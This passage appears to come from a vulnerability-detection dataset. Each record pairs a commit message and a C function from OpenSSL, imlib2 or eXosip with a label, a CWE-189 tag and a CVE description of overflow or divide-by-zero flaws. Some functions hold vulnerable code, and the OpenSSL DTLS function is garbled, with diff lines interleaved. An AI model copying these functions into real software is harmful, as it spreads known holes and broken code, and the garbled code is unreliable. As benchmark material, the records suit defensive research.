handshake. In this\ncase there is no MAC key negotiated yet. Therefore an attacker can send a\nmessage for the current epoch with a very large sequence number. The code\nwill process the record as normal. If the hanshake message sequence number\n(as opposed to the record sequence number that we have been talking about\nso far) is in the future then the injected message is bufferred to be\nhandled later, but the window is still updated. Therefore all subsequent\nlegitimate handshake records are dropped. This aspect is not considered a\nsecurity issue because there are many ways for an attacker to disrupt the\ninitial handshake and prevent it from completing successfully (e.g.\ninjection of a handshake message will cause the Finished MAC to fail and\nthe handshake to be aborted). This issue comes about as a result of trying\nto do replay protection, but having no integrity mechanism in place yet.\nDoes it even make sense to have replay protection in epoch 0? That\nissue isn't addressed here though.\n\nThis addressed an OCAP Audit issue.\n\nCVE-2016-2181\n\nReviewed-by: Richard Levitte <levitte@openssl.org>", "target": 0, "func": "int dtls1_process_buffered_records(SSL *s)\n {\n     pitem *item;\n     SSL3_BUFFER *rb;\n    SSL3_RECORD *rr;\n    DTLS1_BITMAP *bitmap;\n    unsigned int is_next_epoch;\n    int replayok = 1;\n \n     item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n     if (item) {\n         /* Check if epoch is current. */\n         if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n            return 1;         /* Nothing to do. */\n\n        rr = RECORD_LAYER_get_rrec(&s->rlayer);\n \n         rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n \n             */\n            return 1;\n        }\n\n        /* Process all the records. */\n        while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n            dtls1_get_unprocessed_record(s);\n            if (!dtls1_process_record(s))\n                return (0);\n            if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n         /* Process all the records. */\n         while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n             dtls1_get_unprocessed_record(s);\n            bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n            if (bitmap == NULL) {\n                /*\n                 * Should not happen. This will only ever be NULL when the\n                 * current record is from a different epoch. But that cannot\n                 * be the case because we already checked the epoch above\n                 */\n                 SSLerr(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS,\n                        ERR_R_INTERNAL_ERROR);\n                 return 0;\n            }\n#ifndef OPENSSL_NO_SCTP\n            /* Only do replay check if no SCTP bio */\n            if (!BIO_dgram_is_sctp(SSL_get_rbio(s)))\n#endif\n            {\n                /*\n                 * Check whether this is a repeat, or aged record. We did this\n                 * check once already when we first received the record - but\n                 * we might have updated the window since then due to\n                 * records we subsequently processed.\n                 */\n                replayok = dtls1_record_replay_check(s, bitmap);\n            }\n\n            if (!replayok || !dtls1_process_record(s, bitmap)) {\n                /* dump this record */\n                rr->length = 0;\n                RECORD_LAYER_reset_packet_length(&s->rlayer);\n                continue;\n            }\n\n             if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) < 0)\n                return 0;\n         }\n     }\n \n *             here, anything else is handled by higher layers\n *     Application data protocol\n *             none of our business\n */\n     s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n     s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n \n    return 1;\n }\n", "func_hash": 309108341902743358947983564642524306672, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2181", "cve_desc": "The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2181"}
{"idx": 158253, "project": "openssl", "commit_id": "3f3582139fbb259a1c3cbb0a25236500a409bf26", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=3f3582139fbb259a1c3cbb0a25236500a409bf26", "commit_message": "Fix encrypt overflow\n\nAn overflow can occur in the EVP_EncryptUpdate function. If an attacker is\nable to supply very large amounts of input data after a previous call to\nEVP_EncryptUpdate with a partial block then a length check can overflow\nresulting in a heap corruption.\n\nFollowing an analysis of all OpenSSL internal usage of the\nEVP_EncryptUpdate function all usage is one of two forms.\n\nThe first form is like this:\nEVP_EncryptInit()\nEVP_EncryptUpdate()\n\ni.e. where the EVP_EncryptUpdate() call is known to be the first called\nfunction after an EVP_EncryptInit(), and therefore that specific call\nmust be safe.\n\nThe second form is where the length passed to EVP_EncryptUpdate() can be\nseen from the code to be some small value and therefore there is no\npossibility of an overflow.\n\nSince all instances are one of these two forms, I believe that there can\nbe no overflows in internal code due to this problem.\n\nIt should be noted that EVP_DecryptUpdate() can call EVP_EncryptUpdate()\nin certain code paths. Also EVP_CipherUpdate() is a synonym for\nEVP_EncryptUpdate(). Therefore I have checked all instances of these\ncalls too, and came to the same conclusion, i.e. there are no instances\nin internal usage where an overflow could occur.\n\nThis could still represent a security issue for end user code that calls\nthis function directly.\n\nCVE-2016-2106\n\nIssue reported by Guido Vranken.\n\nReviewed-by: Tim Hudson <tjh@openssl.org>", "target": 0, "func": "int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j, bl;\n\n    if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {\n        i = ctx->cipher->do_cipher(ctx, out, in, inl);\n        if (i < 0)\n            return 0;\n        else\n            *outl = i;\n        return 1;\n    }\n\n    if (inl <= 0) {\n        *outl = 0;\n        return inl == 0;\n    }\n\n    if (ctx->buf_len == 0 && (inl & (ctx->block_mask)) == 0) {\n        if (ctx->cipher->do_cipher(ctx, out, in, inl)) {\n            *outl = inl;\n            return 1;\n        } else {\n            *outl = 0;\n            return 0;\n        }\n    }\n    i = ctx->buf_len;\n     bl = ctx->cipher->block_size;\n     OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n     if (i != 0) {\n        if (bl - i > inl) {\n             memcpy(&(ctx->buf[i]), in, inl);\n             ctx->buf_len += inl;\n             *outl = 0;\n            return 1;\n        } else {\n            j = bl - i;\n            memcpy(&(ctx->buf[i]), in, j);\n            if (!ctx->cipher->do_cipher(ctx, out, ctx->buf, bl))\n                return 0;\n            inl -= j;\n            in += j;\n            out += bl;\n            *outl = bl;\n        }\n    } else\n        *outl = 0;\n    i = inl & (bl - 1);\n    inl -= i;\n    if (inl > 0) {\n        if (!ctx->cipher->do_cipher(ctx, out, in, inl))\n            return 0;\n        *outl += inl;\n    }\n\n    if (i != 0)\n        memcpy(ctx->buf, &(in[inl]), i);\n    ctx->buf_len = i;\n    return 1;\n}\n", "func_hash": 298263153019277204239133724403567540191, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2106", "cve_desc": "Integer overflow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2106"}
{"idx": 158254, "project": "openssl", "commit_id": "5b814481f3573fa9677f3a31ee51322e2a22ee6a", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=5b814481f3573fa9677f3a31ee51322e2a22ee6a", "commit_message": "Avoid overflow in EVP_EncodeUpdate\n\nAn overflow can occur in the EVP_EncodeUpdate function which is used for\nBase64 encoding of binary data. If an attacker is able to supply very large\namounts of input data then a length check can overflow resulting in a heap\ncorruption. Due to the very large amounts of data involved this will most\nlikely result in a crash.\n\nInternally to OpenSSL the EVP_EncodeUpdate function is primarly used by the\nPEM_write_bio* family of functions. These are mainly used within the\nOpenSSL command line applications, so any application which processes\ndata from an untrusted source and outputs it as a PEM file should be\nconsidered vulnerable to this issue.\n\nUser applications that call these APIs directly with large amounts of\nuntrusted data may also be vulnerable.\n\nIssue reported by Guido Vranken.\n\nCVE-2016-2105\n\nReviewed-by: Richard Levitte <levitte@openssl.org>", "target": 0, "func": "void EVP_EncodeUpdate(EVP_ENCODE_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j;\n    unsigned int total = 0;\n\n    *outl = 0;\n     if (inl <= 0)\n         return;\n     OPENSSL_assert(ctx->length <= (int)sizeof(ctx->enc_data));\n    if (ctx->length - ctx->num > inl) {\n         memcpy(&(ctx->enc_data[ctx->num]), in, inl);\n         ctx->num += inl;\n         return;\n    }\n    if (ctx->num != 0) {\n        i = ctx->length - ctx->num;\n        memcpy(&(ctx->enc_data[ctx->num]), in, i);\n        in += i;\n        inl -= i;\n        j = EVP_EncodeBlock(out, ctx->enc_data, ctx->length);\n        ctx->num = 0;\n        out += j;\n        *(out++) = '\\n';\n        *out = '\\0';\n        total = j + 1;\n    }\n    while (inl >= ctx->length) {\n        j = EVP_EncodeBlock(out, in, ctx->length);\n        in += ctx->length;\n        inl -= ctx->length;\n        out += j;\n        *(out++) = '\\n';\n        *out = '\\0';\n        total += j + 1;\n    }\n    if (inl != 0)\n        memcpy(&(ctx->enc_data[0]), in, inl);\n    ctx->num = inl;\n    *outl = total;\n}\n", "func_hash": 94268136621199293469983375487658326449, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2105", "cve_desc": "Integer overflow in the EVP_EncodeUpdate function in crypto/evp/encode.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of binary data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2105"}
{"idx": 158314, "project": "enlightment", "commit_id": "c21beaf1780cf3ca291735ae7d58a3dde63277a2", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?h=v1.4.7&id=c21beaf1780cf3ca291735ae7d58a3dde63277a2", "commit_message": "None", "target": 0, "func": "load(ImlibImage * im, ImlibProgressFunction progress,\n     char progress_granularity, char immediate_load)\n{\n   int                 rc;\n   char                p = ' ', numbers = 3, count = 0;\n   int                 w = 0, h = 0, v = 255, c = 0;\n   char                buf[256];\n   FILE               *f = NULL;\n\n   if (im->data)\n      return 0;\n   f = fopen(im->real_file, \"rb\");\n   if (!f)\n      return 0;\n\n   /* can't use fgets(), because there might be\n    * binary data after the header and there\n    * needn't be a newline before the data, so\n    * no chance to distinguish between end of buffer\n    * and a binary 0.\n    */\n\n   /* read the header info */\n\n   rc = 0;                      /* Error */\n\n   c = fgetc(f);\n   if (c != 'P')\n      goto quit;\n\n   p = fgetc(f);\n   if (p == '1' || p == '4')\n      numbers = 2;              /* bitimages don't have max value */\n\n   if ((p < '1') || (p > '8'))\n      goto quit;\n\n   count = 0;\n   while (count < numbers)\n     {\n        c = fgetc(f);\n\n        if (c == EOF)\n           goto quit;\n\n        /* eat whitespace */\n        while (isspace(c))\n           c = fgetc(f);\n        /* if comment, eat that */\n        if (c == '#')\n          {\n             do\n                c = fgetc(f);\n             while (c != '\\n' && c != EOF);\n          }\n        /* no comment -> proceed */\n        else\n          {\n             int                 i = 0;\n\n             /* read numbers */\n             while (c != EOF && !isspace(c) && (i < 255))\n               {\n                  buf[i++] = c;\n                  c = fgetc(f);\n               }\n             if (i)\n               {\n                  buf[i] = 0;\n                  count++;\n                  switch (count)\n                    {\n                       /* width */\n                    case 1:\n                       w = atoi(buf);\n                       break;\n                       /* height */\n                    case 2:\n                       h = atoi(buf);\n                       break;\n                       /* max value, only for color and greyscale */\n                    case 3:\n                       v = atoi(buf);\n                       break;\n                    }\n               }\n          }\n     }\n   if ((v < 0) || (v > 255))\n      goto quit;\n\n   im->w = w;\n   im->h = h;\n   if (!IMAGE_DIMENSIONS_OK(w, h))\n      goto quit;\n\n   if (!im->format)\n     {\n        if (p == '8')\n           SET_FLAG(im->flags, F_HAS_ALPHA);\n        else\n           UNSET_FLAG(im->flags, F_HAS_ALPHA);\n        im->format = strdup(\"pnm\");\n     }\n\n   rc = 1;                      /* Ok */\n\n   if (((!im->data) && (im->loader)) || (immediate_load) || (progress))\n     {\n        DATA8              *data = NULL;        /* for the binary versions */\n        DATA8              *ptr = NULL;\n        int                *idata = NULL;       /* for the ASCII versions */\n        int                *iptr;\n        char                buf2[256];\n        DATA32             *ptr2;\n        int                 i, j, x, y, pl = 0;\n        char                pper = 0;\n\n        /* must set the im->data member before callign progress function */\n        ptr2 = im->data = malloc(w * h * sizeof(DATA32));\n        if (!im->data)\n           goto quit_error;\n\n        /* start reading the data */\n        switch (p)\n          {\n          case '1':            /* ASCII monochrome */\n             buf[0] = 0;\n             i = 0;\n             for (y = 0; y < h; y++)\n               {\n                  x = 0;\n                  while (x < w)\n                    {\n                       if (!buf[i])     /* fill buffer */\n                         {\n                            if (!fgets(buf, 255, f))\n                               goto quit_error;\n                            i = 0;\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       if (buf[i])\n                         {\n                            if (buf[i] == '1')\n                               *ptr2 = 0xff000000;\n                            else if (buf[i] == '0')\n                               *ptr2 = 0xffffffff;\n                            else\n                               goto quit_error;\n                            ptr2++;\n                            i++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '2':            /* ASCII greyscale */\n             idata = malloc(sizeof(int) * w);\n             if (!idata)\n                goto quit_error;\n\n             buf[0] = 0;\n             i = 0;\n             j = 0;\n             for (y = 0; y < h; y++)\n               {\n                  iptr = idata;\n                  x = 0;\n                  while (x < w)\n                    {\n                       int                 k;\n\n                       /* check 4 chars ahead to see if we need to\n                        * fill the buffer */\n                       for (k = 0; k < 4; k++)\n                         {\n                            if (!buf[i + k])    /* fill buffer */\n                              {\n                                 if (fseek(f, -k, SEEK_CUR) == -1 ||\n                                     !fgets(buf, 255, f))\n                                    goto quit_error;\n                                 i = 0;\n                                 break;\n                              }\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       while (buf[i] && !isspace(buf[i]))\n                          buf2[j++] = buf[i++];\n                       if (j)\n                         {\n                            buf2[j] = 0;\n                            *(iptr++) = atoi(buf2);\n                            j = 0;\n                            x++;\n                          }\n                     }\n                   iptr = idata;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (iptr[0] << 16) | (iptr[0] << 8)\n                               | iptr[0];\n                            ptr2++;\n                            iptr++;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((iptr[0] * 255) / v) << 16) |\n                               (((iptr[0] * 255) / v) << 8) |\n                               ((iptr[0] * 255) / v);\n                            ptr2++;\n                            iptr++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '3':            /* ASCII RGB */\n             idata = malloc(3 * sizeof(int) * w);\n             if (!idata)\n                goto quit_error;\n\n             buf[0] = 0;\n             i = 0;\n             j = 0;\n             for (y = 0; y < h; y++)\n               {\n                  int                 w3 = 3 * w;\n\n                  iptr = idata;\n                  x = 0;\n                  while (x < w3)\n                    {\n                       int                 k;\n\n                       /* check 4 chars ahead to see if we need to\n                        * fill the buffer */\n                       for (k = 0; k < 4; k++)\n                         {\n                            if (!buf[i + k])    /* fill buffer */\n                              {\n                                 if (fseek(f, -k, SEEK_CUR) == -1 ||\n                                     !fgets(buf, 255, f))\n                                    goto quit_error;\n                                 i = 0;\n                                 break;\n                              }\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       while (buf[i] && !isspace(buf[i]))\n                          buf2[j++] = buf[i++];\n                       if (j)\n                         {\n                            buf2[j] = 0;\n                            *(iptr++) = atoi(buf2);\n                            j = 0;\n                            x++;\n                          }\n                     }\n                   iptr = idata;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (iptr[0] << 16) | (iptr[1] << 8)\n                               | iptr[2];\n                            ptr2++;\n                            iptr += 3;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((iptr[0] * 255) / v) << 16) |\n                               (((iptr[1] * 255) / v) << 8) |\n                               ((iptr[2] * 255) / v);\n                            ptr2++;\n                            iptr += 3;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '4':            /* binary 1bit monochrome */\n             data = malloc((w + 7) / 8 * sizeof(DATA8));\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, (w + 7) / 8, 1, f))\n                     goto quit_error;\n\n                  ptr = data;\n                  for (x = 0; x < w; x += 8)\n                    {\n                       j = (w - x >= 8) ? 8 : w - x;\n                       for (i = 0; i < j; i++)\n                         {\n                            if (ptr[0] & (0x80 >> i))\n                               *ptr2 = 0xff000000;\n                            else\n                               *ptr2 = 0xffffffff;\n                            ptr2++;\n                         }\n                       ptr++;\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '5':            /* binary 8bit grayscale GGGGGGGG */\n             data = malloc(1 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 1, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (ptr[0] << 16) | (ptr[0] << 8) |\n                               ptr[0];\n                            ptr2++;\n                            ptr++;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[0] * 255) / v) << 8) |\n                               ((ptr[0] * 255) / v);\n                            ptr2++;\n                            ptr++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '6':            /* 24bit binary RGBRGBRGB */\n             data = malloc(3 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 3, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (ptr[0] << 16) | (ptr[1] << 8) |\n                               ptr[2];\n                            ptr2++;\n                            ptr += 3;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[1] * 255) / v) << 8) |\n                               ((ptr[2] * 255) / v);\n                            ptr2++;\n                            ptr += 3;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '7':            /* XV's 8bit 332 format */\n             data = malloc(1 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 1, 1, f))\n                     break;\n\n                  ptr = data;\n                  for (x = 0; x < w; x++)\n                    {\n                       int                 r, g, b;\n\n                       r = (*ptr >> 5) & 0x7;\n                       g = (*ptr >> 2) & 0x7;\n                       b = (*ptr) & 0x3;\n                       *ptr2 =\n                          0xff000000 |\n                          (((r << 21) | (r << 18) | (r << 15)) & 0xff0000) |\n                          (((g << 13) | (g << 10) | (g << 7)) & 0xff00) |\n                          ((b << 6) | (b << 4) | (b << 2) | (b << 0));\n                       ptr2++;\n                       ptr++;\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '8':            /* 24bit binary RGBARGBARGBA */\n             data = malloc(4 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 4, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               (ptr[3] << 24) | (ptr[0] << 16) |\n                               (ptr[1] << 8) | ptr[2];\n                            ptr2++;\n                            ptr += 4;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               (((ptr[3] * 255) / v) << 24) |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[1] * 255) / v) << 8) |\n                               ((ptr[2] * 255) / v);\n                            ptr2++;\n                            ptr += 4;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          default:\n           quit_error:\n             rc = 0;\n             break;\n           quit_progress:\n             rc = 2;\n             break;\n          }\n        if (idata)\n           free(idata);\n        if (data)\n           free(data);\n     }\n quit:\n   fclose(f);\n   return rc;\n}\n", "func_hash": 4455296634675838674960556975759038545, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9763", "cve_desc": "imlib2 before 1.4.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted PNM file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9763"}
{"idx": 158319, "project": "enlightment", "commit_id": "c94d83ccab15d5ef02f88d42dce38ed3f0892882", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=c94d83ccab15d5ef02f88d42dce38ed3f0892882", "commit_message": "None", "target": 0, "func": "__imlib_Ellipse_DrawToData(int xc, int yc, int a, int b, DATA32 color,\n                           DATA32 * dst, int dstw, int clx, int cly, int clw,\n                           int clh, ImlibOp op, char dst_alpha, char blend)\n{\n   ImlibPointDrawFunction pfunc;\n   int                 xx, yy, x, y, prev_x, prev_y, ty, by, lx, rx;\n   DATA32              a2, b2, *tp, *bp;\n   DATA64              dx, dy;\n\n   if (A_VAL(&color) == 0xff)\n      blend = 0;\n   pfunc = __imlib_GetPointDrawFunction(op, dst_alpha, blend);\n   if (!pfunc)\n      return;\n\n   xc -= clx;\n   yc -= cly;\n   dst += (dstw * cly) + clx;\n\n   a2 = a * a;\n   b2 = b * b;\n\n   yy = b << 16;\n   prev_y = b;\n\n   dx = a2 * b;\n   dy = 0;\n\n   ty = yc - b - 1;\n   by = yc + b;\n   lx = xc - 1;\n   rx = xc;\n\n   tp = dst + (dstw * ty) + lx;\n   bp = dst + (dstw * by) + lx;\n\n   while (dy < dx)\n     {\n        int                 len;\n\n        y = yy >> 16;\n        y += ((yy - (y << 16)) >> 15);\n\n        if (prev_y != y)\n          {\n             prev_y = y;\n             dx -= a2;\n             ty++;\n             by--;\n             tp += dstw;\n             bp -= dstw;\n          }\n\n        len = rx - lx;\n\n        if (IN_RANGE(lx, ty, clw, clh))\n           pfunc(color, tp);\n        if (IN_RANGE(rx, ty, clw, clh))\n           pfunc(color, tp + len);\n        if (IN_RANGE(lx, by, clw, clh))\n           pfunc(color, bp);\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n        if (dx < 1)\n           dx = 1;\n\n         dy += b2;\n         yy -= ((dy << 16) / dx);\n         lx--;\n\n        if ((lx < 0) && (rx > clw))\n           return;\n        if ((ty > clh) || (by < 0))\n           return;\n     }\n\n   xx = yy;\n   prev_x = xx >> 16;\n\n   dx = dy;\n\n   ty++;\n   by--;\n\n   tp += dstw;\n   bp -= dstw;\n\n   while (ty < yc)\n     {\n        int                 len;\n\n        x = xx >> 16;\n        x += ((xx - (x << 16)) >> 15);\n\n        if (prev_x != x)\n          {\n             prev_x = x;\n             dy += b2;\n             lx--;\n             rx++;\n             tp--;\n             bp--;\n          }\n\n        len = rx - lx;\n\n        if (IN_RANGE(lx, ty, clw, clh))\n           pfunc(color, tp);\n        if (IN_RANGE(rx, ty, clw, clh))\n           pfunc(color, tp + len);\n        if (IN_RANGE(lx, by, clw, clh))\n           pfunc(color, bp);\n        if (IN_RANGE(rx, by, clw, clh))\n           pfunc(color, bp + len);\n\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n        if (dy < 1)\n           dy = 1;\n\n         dx -= a2;\n         xx += ((dx << 16) / dy);\n         ty++;\n        if ((ty > clh) || (by < 0))\n           return;\n     }\n}\n", "func_hash": 284104794435585416377253518082548721553, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-5326", "cve_desc": "imlib2 before 1.4.9 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) by drawing a 2x1 ellipse.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-5326"}
{"idx": 158374, "project": "savannah", "commit_id": "2549e421c14aff886629b8482c14af800f411070", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "http://git.savannah.nongnu.org/cgit/exosip.git/commit/?id=2549e421c14aff886629b8482c14af800f411070", "commit_message": "None", "target": 0, "func": "eXosip_init (struct eXosip_t *excontext)\n{\n  osip_t *osip;\n  int i;\n\n  memset (excontext, 0, sizeof (eXosip_t));\n\n  excontext->dscp = 0x1A;\n\n  snprintf (excontext->ipv4_for_gateway, 256, \"%s\", \"217.12.3.11\");\n  snprintf (excontext->ipv6_for_gateway, 256, \"%s\", \"2001:638:500:101:2e0:81ff:fe24:37c6\");\n\n#ifdef WIN32\n  /* Initializing windows socket library */\n  {\n    WORD wVersionRequested;\n    WSADATA wsaData;\n\n    wVersionRequested = MAKEWORD (1, 1);\n    i = WSAStartup (wVersionRequested, &wsaData);\n    if (i != 0) {\n      OSIP_TRACE (osip_trace (__FILE__, __LINE__, OSIP_WARNING, NULL, \"eXosip: Unable to initialize WINSOCK, reason: %d\\n\", i));\n      /* return -1; It might be already initilized?? */\n    }\n  }\n#endif\n\n  excontext->user_agent = osip_strdup (\"eXosip/\" EXOSIP_VERSION);\n  if (excontext->user_agent == NULL)\n    return OSIP_NOMEM;\n\n  excontext->j_calls = NULL;\n  excontext->j_stop_ua = 0;\n#ifndef OSIP_MONOTHREAD\n  excontext->j_thread = NULL;\n#endif\n  i = osip_list_init (&excontext->j_transactions);\n  excontext->j_reg = NULL;\n\n#ifndef OSIP_MONOTHREAD\n#if !defined (_WIN32_WCE)\n  excontext->j_cond = (struct osip_cond *) osip_cond_init ();\n  if (excontext->j_cond == NULL) {\n    osip_free (excontext->user_agent);\n    excontext->user_agent = NULL;\n    return OSIP_NOMEM;\n  }\n#endif\n\n  excontext->j_mutexlock = (struct osip_mutex *) osip_mutex_init ();\n  if (excontext->j_mutexlock == NULL) {\n    osip_free (excontext->user_agent);\n    excontext->user_agent = NULL;\n#if !defined (_WIN32_WCE)\n    osip_cond_destroy ((struct osip_cond *) excontext->j_cond);\n    excontext->j_cond = NULL;\n#endif\n    return OSIP_NOMEM;\n  }\n#endif\n\n  i = osip_init (&osip);\n  if (i != 0) {\n    OSIP_TRACE (osip_trace (__FILE__, __LINE__, OSIP_ERROR, NULL, \"eXosip: Cannot initialize osip!\\n\"));\n    return i;\n  }\n\n  osip_set_application_context (osip, &excontext);\n\n  _eXosip_set_callbacks (osip);\n\n  excontext->j_osip = osip;\n\n#ifndef OSIP_MONOTHREAD\n  /* open a TCP socket to wake up the application when needed. */\n  excontext->j_socketctl = jpipe ();\n  if (excontext->j_socketctl == NULL)\n    return OSIP_UNDEFINED_ERROR;\n\n  excontext->j_socketctl_event = jpipe ();\n  if (excontext->j_socketctl_event == NULL)\n    return OSIP_UNDEFINED_ERROR;\n#endif\n\n  /* To be changed in osip! */\n  excontext->j_events = (osip_fifo_t *) osip_malloc (sizeof (osip_fifo_t));\n  if (excontext->j_events == NULL)\n    return OSIP_NOMEM;\n  osip_fifo_init (excontext->j_events);\n\n  excontext->use_rport = 1;\n  excontext->dns_capabilities = 2;\n  excontext->enable_dns_cache = 1;\n  excontext->ka_interval = 17000;\n  snprintf(excontext->ka_crlf, sizeof(excontext->ka_crlf), \"\\r\\n\\r\\n\");\n  excontext->ka_options = 0;\n   excontext->autoanswer_bye = 1;\n   excontext->auto_masquerade_contact = 1;\n   excontext->masquerade_via=0;\n  excontext->use_ephemeral_port=1;\n \n   return OSIP_SUCCESS;\n }\n", "func_hash": 334860864183560227167682843878153050051, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-10375", "cve_desc": "handle_messages in eXtl_tls.c in eXosip before 5.0.0 mishandles a negative value in a content-length header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-10375"}
